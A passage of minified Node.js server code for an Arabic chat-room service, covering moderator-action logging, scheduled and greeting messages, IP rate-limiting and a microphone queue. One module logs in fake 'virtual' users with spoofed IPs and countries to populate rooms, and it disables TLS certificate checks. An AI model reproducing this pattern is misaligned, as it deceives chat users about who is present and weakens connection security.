        new Promise((r, i) => {
            s.db.query("INSERT INTO ordersReg (byRealName, byNickName, toRealName, toNickName, notes, actionType, created_at, updated_at) VALUES (?,?,?,?,?,?,?,?)", [e.name, e.getUsername(), t ? t.name : "/", t ? t.getUsername() : "/", "/", "wall-remove", new Date, new Date], (function(e, t) {
                e && i(e), r(t)
            }))
        }).catch(e => {})
    }, s.prototype.orderChangeRoom = function(e, t) {
        const s = this;
        new Promise((r, i) => {
            const o = t.room ? "تم نقله إلى " + t.room.name : "/";
            s.db.query("INSERT INTO ordersReg (byRealName, byNickName, toRealName, toNickName, notes, actionType, created_at, updated_at) VALUES (?,?,?,?,?,?,?,?)", [e.name, e.getUsername(), t.name, t.getUsername(), o, "orders-change-room", new Date, new Date], (function(e, t) {
                e && i(e), r(t)
            }))
        }).catch(e => {})
    }, s.prototype.changeRole = function(e, t, s) {
        const r = this;
        new Promise((i, o) => {
            const n = "تم تغيير رتبته إلى " + s;
            r.db.query("INSERT INTO ordersReg (byRealName, byNickName, toRealName, toNickName, notes, actionType, created_at, updated_at) VALUES (?,?,?,?,?,?,?,?)", [e.name, e.getUsername(), t.name, t.getUsername(), n, "edit-role", new Date, new Date], (function(e, t) {
                e && o(e), i(t)
            }))
        }).catch(e => {})
    }, e.exports = s
}, function(e, t, s) {
    const r = s(0);

    function i(e) {
        this.db = e.db, this.store = e, this.init().then(e => {
            this.fire()
        }).catch(e => {}), this.messages = [], this.loopInterval = null
    }
    i.prototype.init = function() {
        var e = this;
        return new Promise((t, s) => {
            e.db.query("SELECT `id`, `title`, `msg`, `status`, `interval` FROM self_messages", [], (i, o) => {
                try {
                    if (!i && o && o.length) {
                        for (var n in e.messages = [], o) {
                            var a = o[n];
                            e.messages.push({
                                id: a.id,
                                title: r.sanitize(a.title, this.store.shortcuts),
                                msg: r.sanitize(a.msg, this.store.shortcuts),
                                status: a.status,
                                interval: a.interval,
                                lastToggle: Date.now()
                            })
                        }
                        t(e.messages)
                    } else s("no messages found")
                } catch (e) {
                    s(e)
                }
            })
        })
    }, i.prototype.all = function() {
        return this.messages
    }, i.prototype.fire = function() {
        this.messages.length && null == this.loopInterval && (this.loopInterval = setInterval(() => {
            try {
                this.messages.forEach(e => {
                    e.lastToggle || (e.lastToggle = Date.now()), "running" == e.status && Date.now() - e.lastToggle >= 6e4 * e.interval && (this.store.io.emit("res", r.enc({
                        type: "SELF_MESSAGE",
                        data: {
                            message: {
                                title: e.title,
                                msg: e.msg
                            }
                        }
                    })), e.lastToggle = Date.now())
                })
            } catch (e) {
                console.log(e.stack)
            }
        }, 15e3))
    }, i.prototype.add = function(e) {
        return e && "object" == typeof e ? (e.title = r.sanitize(e.title, this.store.shortcuts), e.msg = r.sanitize(e.msg, this.store.shortcuts), this.messages.push(e), this.fire(), e) : null
    }, i.prototype.edit = function(e) {
        if (e && "object" == typeof e) {
            let t = null;
            return this.messages = this.messages.map(s => (s.id == e.id && (s.title = r.sanitize(e.title, this.store.shortcuts), s.msg = r.sanitize(e.msg, this.store.shortcuts), s.status = e.status, s.interval = e.interval, t = s), s)), t
        }
        return null
    }, i.prototype.remove = function(e) {
        e && (this.messages = this.messages.filter(t => t.id != e))
    }, e.exports = i
}, function(e, t, s) {
    const r = s(0);

    function i(e) {
        this.db = e.db, this.store = e, this.init().then(e => {}).catch(e => {}), this.messages = [], this.loopInterval = null
    }
    i.prototype.init = function() {
        var e = this;
        return new Promise((t, s) => {
            e.db.query("SELECT * FROM greeting_messages", [], (i, o) => {
                try {
                    if (!i && o && o.length) {
                        for (var n in e.messages = [], o) {
                            var a = o[n];
                            e.messages.push({
                                id: a.id,
                                title: r.sanitize(a.title, this.store.shortcuts),
                                content: r.sanitize(a.content, this.store.shortcuts),
                                icon: a.icon,
                                titleColor: a.title_color,
                                contentColor: a.content_color,
                                backgroundColor: a.background_color,
                                room: a.room_id
                            })
                        }
                        t(e.messages)
                    } else s("no messages found")
                } catch (e) {
                    s(e)
                }
            })
        })
    }, i.prototype.all = function() {
        return this.messages
    }, i.prototype.getRoomMessages = function(e) {
        return this.messages.filter(t => t.room == e)
    }, i.prototype.add = function(e) {
        return e && "object" == typeof e ? (e.title = r.sanitize(e.title, this.store.shortcuts), e.content = r.sanitize(e.content, this.store.shortcuts), e.icon = e.icon, e.room = e.room, e.titleColor = e.titleColor, e.contentColor = e.contentColor, e.backgroundColor = e.backgroundColor, this.messages.push(e), e) : null
    }, i.prototype.edit = function(e) {
        if (e && "object" == typeof e) {
            let t = null;
            return this.messages = this.messages.map(s => (s.id == e.id && (s.title = r.sanitize(e.title, this.store.shortcuts), s.content = r.sanitize(e.content, this.store.shortcuts), s.titleColor = e.title_color, s.contentColor = e.content_color, s.backgroundColor = e.background_color, s.room = parseInt(e.room_id), t = s), s)), t
        }
        return null
    }, i.prototype.remove = function(e) {
        e && (this.messages = this.messages.filter(t => t.id != e))
    }, i.prototype.changeIcon = function(e) {
        e.id && (this.messages = this.messages.map(t => (t.id == e.id && (t.title = t.title, t.content = t.content, t.titleColor = t.titleColor, t.contentColor = t.contentColor, t.backgroundColor = t.backgroundColor, t.room = t.room, t.icon = e.icon), t)))
    }, i.prototype.greet = function(e) {
        e && e.room && e.socket && e.socket.emit("res", r.enc({
            type: "GREET_USER",
            data: {
                messages: this.getRoomMessages(e.room.id),
                defaulRoomFlag: e.room.icon
            }
        }))
    }, e.exports = i
}, function(e, t, s) {
    const r = s(59),
        i = s(60);

    function o(e) {
        this.db = e.db, this.store = e, this.init().then(e => {
            this.fire()
        }).catch(e => {}), this.users = [], this.loopInterval = null
    }
    o.prototype.init = function() {
        var e = this;
        return new Promise((t, s) => {
            e.db.query("SELECT * FROM users WHERE is_virtual = 1", [], (r, i) => {
                try {
                    if (!r && i && i.length) {
                        for (var o in e.users = [], i) {
                            var n = i[o];
                            e.users.push({
                                id: n.id,
                                name: n.name,
                                avatar: n.avatar,
                                device: n.device,
                                ip: n.ip,
                                country: n.country,
                                defaultRoom: n.default_room
                            })
                        }
                        t(e.users)
                    } else s("no users found")
                } catch (e) {
                    s(e)
                }
            })
        })
    }, o.prototype.all = function() {
        return this.users
    }, o.prototype.fire = function() {
        this.users.length && null == this.loopInterval && (this.loopInterval = setInterval(() => {
            setTimeout(() => {
                var e = Math.floor(Math.random() * this.users.length),
                    t = this.users[e];
                t && this.store.virtualUserIds.length < this.store.settings.get("virtuals_count") && !this.store.settings.get("disable_virtuals") && (this.store.virtualUserIds.includes(t.id) || new r(i, t, this.store))
            }, 10 * Math.floor(1 * Math.random() + 1) * 1e3)
        }, 15e3))
    }, o.prototype.add = function(e) {
        return e && "object" == typeof e ? (this.users.push({
            id: e.id,
            name: e.name,
            device: e.device,
            ip: e.ip,
            country: e.country
        }), this.fire(), e) : null
    }, o.prototype.remove = function(e) {
        e && (this.users = this.users.filter(t => t.id != e))
    }, e.exports = o
}, function(e, t, s) {
    const r = s(0);
    e.exports = function(e, t, s) {
        this.joinRoomTimeout = null;
        try {
            if (s.config.local) var i = s.config.host.substring(0, s.config.host.length - 1),
                o = e.connect(i + ":" + s.config.port, {
                    transports: ["websocket", "polling"],
                    secure: !0,
                    rejectUnauthorized: !1,
                    query: "ADMIN_HASH=" + s.config.adminHash + "&is_virtual=true&d=fdljfdlfjlkdjd&fp=fdlkfjkdljfdlkjff"
                });
            else i = s.config.host.substring(0, s.config.host.length - 1), o = e.connect(i + ":" + s.config.port, {
                transports: ["websocket", "polling"],
                secure: !0,
                rejectUnauthorized: !1,
                query: "ADMIN_HASH=" + s.config.adminHash + "&is_virtual=true"
            });
            o.emit("req", r.enc({
                type: "SET_LOCATION",
                data: {
                    ip: t.ip,
                    country: t.country,
                    device: t.device
                }
            }), () => {
                o.emit("req", r.enc({
                    type: "MEMBER_LOGIN",
                    data: {
                        name: t.name,
                        password: "#virtuals_default_password#",
                        hidden: !1
                    }
                }), e => {
                    this.joinRoomTimeout = setTimeout(() => {
                        o.emit("req", r.enc({
                            type: "JOIN_ROOM",
                            data: {
                                id: e,
                                password: null
                            }
                        }), e => {})
                    }, 5e3)
                })
            }), setTimeout(() => {
                this.joinRoomTimeout && clearTimeout(this.joinRoomTimeout), o.disconnect()
            }, 60 * Math.floor(900 * Math.random() + 500) * 1e3)
        } catch (e) {
            console.log(e.stack)
        }
    }
}, function(e, t) {
    e.exports = require("socket.io-client")
}, function(e, t) {
    function s(e) {
        this.store = e
    }
    s.prototype.check = function(e, t, s, r) {
        try {
            if (e.requests[t] || (e.requests[t] = []), e.requests[t].push(Date.now()), e.requests[t].length > r) {
                for (var i = [], o = 0; o < r; o++) i.push(e.requests[t][e.requests[t].length - r + o]);
                i[r - 1] - i[0] <= 1e3 * s && (e.socket && e.socket.disconnect(), e.logout(), this.store.bannedIps.push(e.ip)), e.requests[t] = i
            }
        } catch (e) {
            log(e)
        }
    }, e.exports = s
}, function(e, t, s) {
    const r = s(1),
        i = s(0);

    function o(e) {
        this.config = {}, this.config.global = void 0 !== this.config.global, this.store = e, this.io = e.io, this.permissions = e.permissions, this.interval = 0, this.speaker = null, this.room = Date.now() + "", this.subscribers = [], this.listeners = [], this.speakerTimeoutID = null
    }
    o.prototype.requestMic = function(e) {
        if (e instanceof r) return this.permissions.getRadioSpeakTime(e.role) ? void(this.speaker ? this.subscribe(e) : this.speak(e)) : e.socket.emit("res", i.enc({
            type: "NO_MIC_PERMISSIION",
            data: {}
        }))
    }, o.prototype.unRequestMic = function(e) {
        e && (this.speaker && this.speaker.id == e.id ? this.stopSpeaking(e) : this.unsubscribe(e))
    }, o.prototype.speak = function(e) {
        if (!e) return;
        this.speaker = e, this.interval = 60 * this.permissions.getRadioSpeakTime(e.role) * 1e3, this.speaker.socket.emit("res", i.enc({
            type: "MIC_START_SPEAKING",
            data: {
                room: this.room
            }
        })), this.listeners = this.listeners.filter(e => this.speaker.id != e.id), e.micStatus.onMic = !0, e.micStatus.onHand = !1, e.micStartedAt = this.interval + Date.now();
        const t = {
            micStatus: e.micStatus,
            micTime: e.getMicTime()
        };
        this.store.io.emit("res", i.enc({
            type: "USER_UPDATED",
            data: {
                id: e.id,
                reg_id: e.reg_id,
                updates: t
            }
        })), this.broadcast(), this.speakerTimeoutID = setTimeout(() => {
            this.stopSpeaking(e)
        }, this.interval)
    }, o.prototype.stopSpeaking = function(e) {
        this.speaker.socket.emit("res", i.enc({
            type: "MIC_STOP_SPEAKING",
            data: {}
        })), e.micStatus.onMic = !1, e.micStartedAt = null;
        const t = {
            micStatus: e.micStatus
        };
        this.store.io.emit("res", i.enc({
            type: "USER_UPDATED",
            data: {
                id: e.id,
                reg_id: e.reg_id,
                updates: t
            }
        })), this.stopBroadcasting(), this.speakerTimeoutID && (clearTimeout(this.speakerTimeoutID), this.speakerTimeoutID = null), this.startListening(e), this.speaker = null;
        var s = this.subscribers[0];
        this.speak(s), this.unsubscribe(s)
    }, o.prototype.getSpeaker = function() {
        return this.speaker
    }, o.prototype.broadcast = function() {
        this.listeners.forEach(e => {
            e.socket.emit("res", i.enc({
                type: "MIC_START_LISTENING",
                data: {
                    room: this.room
                }
            }))
        })
    }, o.prototype.stopBroadcasting = function() {
        this.listeners.forEach(e => {
            e.socket.emit("res", i.enc({
                type: "MIC_STOP_LISTENING",
                data: {}
            }))
        })
    }, o.prototype.startListening = function(e) {
        this.listeners.filter(t => t.id == e.id).length || this.listeners.push(e), this.speaker && e.socket.emit("res", i.enc({
            type: "MIC_START_LISTENING",
            data: {
                room: this.room
            }
        }))
    }, o.prototype.stopListening = function(e) {
        this.speaker && (this.listeners = this.listeners.filter(t => t.id != e.id), e.socket.emit("res", i.enc({
            type: "MIC_STOP_LISTENING",
            data: {}
        })))
    }, o.prototype.subscribe = function(e) {
        this.subscribers.push(e), e.micStatus.onHand = !0;
        const t = {
            micStatus: e.micStatus
        };
        this.store.io.emit("res", i.enc({
            type: "USER_UPDATED",
            data: {
                id: e.id,
                reg_id: e.reg_id,
                updates: t
            }
        }))
    }, o.prototype.unsubscribe = function(e) {
        if (!e) return;
        this.subscribers = this.subscribers.filter((function(t) {
            return t.id != e.id
        })), e.micStatus.onHand = !1;
        const t = {
            micStatus: e.micStatus
        };
        this.store.io.emit("res", i.enc({
            type: "USER_UPDATED",
            data: {
                id: e.id,
                reg_id: e.reg_id,
                updates: t
            }
        }))
    }, o.prototype.getSubscribers = function() {
        return this.subscribers
    }, o.prototype.getSubscriber = function(e) {
        return this.subscribers.filter((function(e) {
            return e.id == user.id
        }))[0]
    }, o.prototype.isSubscribed = function(e) {
        return !!this.subscribers.filter((function(t) {
            return t.id == e.id
        })).length
    }, e.exports = o
}]);